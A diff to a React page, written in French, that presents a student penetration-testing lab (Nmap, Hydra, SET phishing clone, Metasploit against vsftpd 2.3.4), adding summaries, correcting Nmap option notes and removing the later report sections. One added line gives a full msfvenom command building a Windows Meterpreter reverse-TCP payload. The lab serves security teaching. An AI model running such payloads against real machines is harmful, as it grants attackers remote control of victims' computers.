@@ -1,7 +1,7 @@
 import { useState } from 'react';
 import {
   ArrowLeft, ArrowRight, Terminal, Server, MonitorSmartphone, Network,
-  Search, Key, Mail, Bug, ShieldAlert, ShieldCheck, AlertTriangle,
+  Search, Key, Mail, Bug, ShieldAlert, ShieldCheck,
   CheckCircle2, Download, ChevronDown, Lock, Eye, FileText, Target,
   ListChecks, Calendar, GraduationCap,
 } from 'lucide-react';
@@ -28,7 +28,7 @@ type Manip = {
 const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; manips: Manip[] }[] = [
   {
     id: 'nmap', label: 'Nmap', icon: Search,
-    resume: "Phase de reconnaissance : identifier les machines actives, les ports ouverts et les versions des services avant toute tentative d'attaque.",
+    resume: "Phase de reconnaissance : identifier les machines actives, les ports ouverts et les versions des services avant toute tentative d'attaque. Bilan : cette phase révèle un service clé, vsftpd 2.3.4, qui sera exploité plus loin avec Metasploit.",
     manips: [
       {
         objectif: 'Identifier les machines actives sur le réseau du laboratoire.',
@@ -43,8 +43,8 @@ const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; m
       },
       {
         objectif: "Déterminer les ports ouverts, les versions des services et le système d'exploitation d'une cible.",
-        outil: 'Nmap — options -sV, -A (et -P- utilisée dans le rapport pour tenter la détection du système)',
-        principe: "-sV interroge chaque port ouvert pour en déduire la version du service ; -A combine plusieurs techniques de détection.",
+        outil: "Nmap — options -sV (version des services) et -O (détection du système d'exploitation)",
+        principe: "-sV interroge chaque port ouvert pour en déduire la version exacte du service ; -O s'appuie sur les particularités de la pile réseau pour estimer le système d'exploitation (à ne pas confondre avec -Pn, qui désactive seulement le test de disponibilité par ping). Un port « closed » signifie qu'une réponse a été reçue sans service à l'écoute, ce qui diffère d'un port « filtered », bloqué activement par un pare-feu.",
         capture: 'Scan détaillé (-sV) de la machine Metasploitable',
         montre: 'Des services datés : vsftpd 2.3.4 (port 21), OpenSSH 4.7p1 (port 22), Telnet (port 23).',
         resultat: 'Le service vsftpd 2.3.4, dont une porte dérobée est publiquement connue, est identifié.',
@@ -55,7 +55,7 @@ const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; m
     ],
   },
   {
-    id: 'hydra', label: 'Hydra', icon: Key, resume: "Évaluation de la robustesse des identifiants de connexion par attaque de force brute.",
+    id: 'hydra', label: 'Hydra', icon: Key, resume: "Évaluation de la robustesse des identifiants de connexion par attaque de force brute. Bilan : un mot de passe faible suffit à ouvrir un accès complet, sans qu'aucune faille logicielle ne soit nécessaire.",
     manips: [
       {
         objectif: 'Disposer de dictionnaires de mots de passe à tester.',
@@ -93,7 +93,7 @@ const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; m
     ],
   },
   {
-    id: 'set', label: 'SET', icon: Mail, resume: "Simulation d'ingénierie sociale : clonage d'une page de connexion pour sensibiliser au risque du phishing.",
+    id: 'set', label: 'SET', icon: Mail, resume: "Simulation d'ingénierie sociale : clonage d'une page de connexion pour sensibiliser au risque du phishing. Bilan : le maillon humain contourne entièrement la sécurité technique, d'où l'importance de la sensibilisation et de la double authentification.",
     manips: [
       {
         objectif: 'Préparer une page web imitant une page de connexion légitime.',
@@ -142,7 +142,7 @@ const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; m
     ],
   },
   {
-    id: 'metasploit', label: 'Metasploit', icon: Bug, resume: "Recherche et exploitation d'une vulnérabilité connue, puis prise de contrôle à distance.",
+    id: 'metasploit', label: 'Metasploit', icon: Bug, resume: "Recherche et exploitation d'une vulnérabilité connue, puis prise de contrôle à distance. Bilan : l'enchaînement reconnaissance → identifiants → exploitation transforme trois faiblesses modestes en une compromission totale.",
     manips: [
       {
         objectif: 'Rechercher un exploit correspondant au service vulnérable identifié.',
@@ -168,8 +168,8 @@ const TOOLS: { id: string; label: string; icon: typeof Search; resume: string; m
       },
       {
         objectif: "Générer un payload et établir une connexion reverse TCP.",
-        outil: 'msfvenom (payload Meterpreter) puis exploit/multi/handler',
-        principe: "Le fichier généré initie une connexion sortante vers l'attaquant dès son exécution par la victime.",
+        outil: 'msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe -o malware.txt, puis exploit/multi/handler',
+        principe: "Le fichier généré (nommé malware.txt par l'option -o dans la commande, puis désigné malware.exe dans le rapport une fois le format exécutable précisé) initie une connexion sortante vers l'attaquant dès son exécution par la victime.",
         capture: "Session Meterpreter obtenue",
         montre: 'Une session Meterpreter ouverte automatiquement après exécution du fichier par la cible.',
         resultat: 'Contrôle complet de la machine Windows ciblée.',
@@ -214,37 +214,40 @@ function ManipCard({ m, n }: { m: Manip; n: number }) {
         onClick={() => setOpen((o) => !o)}
         className="flex w-full items-center justify-between gap-3 px-5 py-4 text-left"
       >
-        <span className="flex items-center gap-3">
+        <span className="flex min-w-0 items-center gap-3">
           <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-electric-500/15 text-xs font-bold text-electric-300">{n}</span>
-          <span className="font-semibold text-night-100">{m.objectif}</span>
+          <span className="break-words font-semibold text-night-100">{m.objectif}</span>
         </span>
         <ChevronDown size={18} className={`shrink-0 text-night-500 transition-transform ${open ? 'rotate-180' : ''}`} aria-hidden="true" />
       </button>
       {open && (
         <div className="border-t border-night-800 px-5 py-5">
           <div className="grid gap-5 md:grid-cols-2">
-            <div className="space-y-4 text-sm">
-              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Outil utilisé</p><p className="text-night-200">{m.outil}</p></div>
-              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Principe de fonctionnement</p><p className="text-night-300">{m.principe}</p></div>
-              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Ce que montre la capture</p><p className="text-night-300">{m.montre}</p></div>
+            <div className="min-w-0 space-y-4 text-sm">
+              <div>
+                <p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Outil utilisé</p>
+                <p className="break-words rounded-md bg-night-950/60 px-2.5 py-2 font-mono text-xs leading-relaxed text-electric-200">{m.outil}</p>
+              </div>
+              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Principe de fonctionnement</p><p className="break-words text-night-200">{m.principe}</p></div>
+              <div><p className="mb-1 text-xs font-semibold uppercase tracking-wide text-night-500">Ce que montre la capture</p><p className="break-words text-night-200">{m.montre}</p></div>
             </div>
-            <figure className="m-0">
+            <figure className="m-0 min-w-0">
               <img src={m.image} alt={m.capture} loading="lazy" className="w-full rounded-lg border border-night-800" />
-              <figcaption className="mt-2 text-xs text-night-500">{m.capture}</figcaption>
+              <figcaption className="mt-2 break-words text-xs text-night-500">{m.capture}</figcaption>
             </figure>
           </div>
           <div className="mt-5 grid gap-3 sm:grid-cols-3">
-            <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
+            <div className="min-w-0 rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
               <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-emerald-400"><CheckCircle2 size={13} aria-hidden="true" /> Résultat observé</p>
-              <p className="text-xs text-night-300">{m.resultat}</p>
+              <p className="break-words text-xs text-night-200">{m.resultat}</p>
             </div>
-            <div className="rounded-lg border border-red-500/20 bg-red-500/5 p-3">
+            <div className="min-w-0 rounded-lg border border-red-500/20 bg-red-500/5 p-3">
               <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-red-400"><ShieldAlert size={13} aria-hidden="true" /> Risque associé</p>
-              <p className="text-xs text-night-300">{m.risque}</p>
+              <p className="break-words text-xs text-night-200">{m.risque}</p>
             </div>
-            <div className="rounded-lg border border-electric-500/20 bg-electric-500/5 p-3">
+            <div className="min-w-0 rounded-lg border border-electric-500/20 bg-electric-500/5 p-3">
               <p className="mb-1 flex items-center gap-1.5 text-xs font-semibold text-electric-300"><ShieldCheck size={13} aria-hidden="true" /> Mesure de protection</p>
-              <p className="text-xs text-night-300">{m.mesure}</p>
+              <p className="break-words text-xs text-night-200">{m.mesure}</p>
             </div>
           </div>
         </div>
@@ -336,128 +339,3 @@ export default function ProjetCybersecurite({ projet, onRetour }: Props) {
               <p className="mt-3 text-xs leading-relaxed text-night-400">{m.detail}</p>
             </div>
           ))}
-        </div>
-      </Section>
-
-      {/* ARCHITECTURE */}
-      {projet.schema && (
-        <Section icon={Network} title="Architecture du laboratoire">
-          <p className="mb-6 leading-relaxed text-night-300">{projet.schemaLegende}</p>
-          <figure className="m-0 overflow-hidden rounded-xl border border-night-800">
-            <img src={projet.schema} alt="Topologie du laboratoire configurée sous GNS3" loading="lazy" className="w-full" />
-          </figure>
-          <figcaption className="mt-2 text-xs text-night-500">Capture authentique de la topologie configurée sous GNS3 (rapport original).</figcaption>
-        </Section>
-      )}
-
-      {/* METHODOLOGIE / OUTILS */}
-      <section id="methodologie" className="border-t border-night-800 py-14 md:py-20">
-        <div className="mx-auto max-w-5xl px-5">
-          <div className="mb-8 flex items-center gap-3">
-            <span className="flex h-10 w-10 shrink-0 items-center justify-center rounded-lg bg-electric-500/10 text-electric-400"><Terminal size={20} aria-hidden="true" /></span>
-            <h2 className="text-2xl font-bold text-white md:text-3xl">Manipulations réalisées</h2>
-          </div>
-
-          <div className="mb-8 flex flex-wrap gap-2 border-b border-night-800 pb-4">
-            {TOOLS.map((t) => (
-              <button
-                key={t.id}
-                type="button"
-                onClick={() => setTab(t.id)}
-                className={`flex items-center gap-2 rounded-lg px-4 py-2 text-sm font-semibold transition-colors ${tab === t.id ? 'bg-electric-500 text-white' : 'bg-night-900 text-night-400 hover:text-night-100'}`}
-              >
-                <t.icon size={15} aria-hidden="true" /> {t.label}
-              </button>
-            ))}
-          </div>
-
-          <p className="mb-6 max-w-2xl leading-relaxed text-night-300">{active.resume}</p>
-
-          <div className="space-y-4">
-            {active.manips.map((m, i) => <ManipCard key={i} m={m} n={i + 1} />)}
-          </div>
-        </div>
-      </section>
-
-      {/* RESULTATS */}
-      <Section icon={Eye} title="Résultats et observations">
-        <ul className="space-y-3">
-          {projet.resultats.map((r, i) => (
-            <li key={i} className="flex items-start gap-2.5 rounded-lg border border-night-800 bg-night-900/30 p-4 text-sm text-night-300">
-              <CheckCircle2 size={16} className="mt-0.5 shrink-0 text-emerald-400" aria-hidden="true" /> {r}
-            </li>
-          ))}
-        </ul>
-      </Section>
-
-      {/* VULNERABILITES / RECOMMANDATIONS */}
-      {projet.vulnerabilites && (
-        <Section icon={ShieldCheck} title="Vulnérabilités identifiées et recommandations de sécurité">
-          <div className="overflow-hidden rounded-xl border border-night-800">
-            <table className="w-full border-collapse text-left text-sm">
-              <thead>
-                <tr className="bg-night-900 text-xs uppercase tracking-wide text-night-500">
-                  <th className="px-4 py-3 font-semibold">Vulnérabilité exploitée</th>
-                  <th className="px-4 py-3 font-semibold">Mesure de protection</th>
-                </tr>
-              </thead>
-              <tbody className="divide-y divide-night-800">
-                {projet.vulnerabilites.map((v, i) => (
-                  <tr key={i} className="align-top odd:bg-night-900/20">
-                    <td className="px-4 py-3 text-night-200">{v.vulnerabilite}</td>
-                    <td className="px-4 py-3 text-night-400">{v.mesure}</td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          </div>
-        </Section>
-      )}
-
-      {/* LIMITES */}
-      {projet.limites && projet.limites.length > 0 && (
-        <Section icon={AlertTriangle} title="Lecture critique du rapport">
-          <p className="mb-4 text-sm text-night-400">Points identifiés lors de l'analyse technique, pour affiner les prochaines versions du rapport :</p>
-          <ul className="space-y-2.5">
-            {projet.limites.map((l, i) => (
-              <li key={i} className="flex items-start gap-2.5 text-sm text-night-400">
-                <span className="mt-1.5 h-1.5 w-1.5 shrink-0 rounded-full bg-amber-500" /> {l}
-              </li>
-            ))}
-          </ul>
-        </Section>
-      )}
-
-      {/* COMPETENCES */}
-      <Section icon={GraduationCap} title="Compétences techniques mobilisées">
-        <div className="flex flex-wrap gap-2.5">
-          {projet.competences.map((c, i) => (
-            <span key={i} className="rounded-lg border border-night-800 bg-night-900/40 px-4 py-2.5 text-sm text-night-200">{c}</span>
-          ))}
-        </div>
-      </Section>
-
-      {/* CONCLUSION */}
-      <Section icon={Lock} title="Conclusion">
-        <div className="rounded-xl border border-night-800 bg-night-900/30 p-6">
-          <p className="leading-relaxed text-night-300">
-            Ce travail a montré qu'une compromission réussit rarement grâce à une seule faille : elle enchaîne des faiblesses
-            techniques (services obsolètes, mots de passe faibles) et humaines (ingénierie sociale). Connaître ces techniques
-            est indispensable pour bien défendre un système — c'est le principe même de l'ethical hacking qui fonde cette démarche.
-          </p>
-          {projet.rapport && (
-            <a href={projet.rapport} download className="btn-primary mt-6 inline-flex">
-              <Download size={16} aria-hidden="true" /> Télécharger le dossier technique complet (PDF)
-            </a>
-          )}
-        </div>
-      </Section>
-
-      <div className="border-t border-night-800 py-10 text-center">
-        <button type="button" onClick={onRetour} className="inline-flex items-center gap-2 text-sm text-night-400 hover:text-electric-300">
-          <ArrowLeft size={16} aria-hidden="true" /> Retour à tous les projets
-        </button>
-      </div>
-    </div>
-  );
-}
